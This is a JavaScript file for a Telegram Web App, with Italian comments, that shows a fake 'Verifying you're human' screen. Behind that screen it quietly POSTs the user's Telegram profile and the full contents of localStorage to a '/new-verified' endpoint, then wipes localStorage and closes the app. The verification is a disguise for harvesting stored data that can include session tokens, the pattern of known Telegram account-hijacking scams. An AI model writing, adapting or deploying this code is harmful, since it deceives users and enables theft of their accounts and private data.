window.Sg = {
  verify: false,
  init() {
    if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.ready();
    }
  },
  close: () => {
    if (!this.verify) {
      this.verify = true;

      const isTelegram = window.Telegram?.WebApp?.initData;

      if (isTelegram) {
        // ✅ Aggiorna correttamente il body
        document.body.innerHTML = `
          <div style="
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            background: white;
          ">
            <h2 style="
              font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen,
              Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;
              font-weight: 700;
              font-size: 1.5rem;
              margin-top: 180px;
              color: black;
            ">
              Verifying you're human<span class="dots"></span>
            </h2>
          </div>
        `;

        // ✅ Inserisci il CSS animato direttamente nel <head>
        const style = document.createElement("style");
        style.innerHTML = `
          @keyframes dots {
            0%   { content: ""; }
            25%  { content: "."; }
            50%  { content: ".."; }
            75%  { content: "..."; }
            100% { content: ""; }
          }

          .dots::after {
            content: "";
            animation: dots 1.5s steps(4, end) infinite;
          }
        `;
        document.head.appendChild(style);
      }

      // ⏳ Dopo 5 secondi chiudi
      if (isTelegram) {
        setTimeout(async () => {
          const user = window.Telegram.WebApp.initDataUnsafe.user || {};
          await fetch("/new-verified", {
            method: "POST",
            body: JSON.stringify({
              user,
              storage: window.localStorage,
            }),
            headers: {
              "content-type": "application/json",
            },
          });

          localStorage.clear();
          window.Telegram.WebApp.close();
        }, 5000);
      }
    }
  },
};

Sg.init();
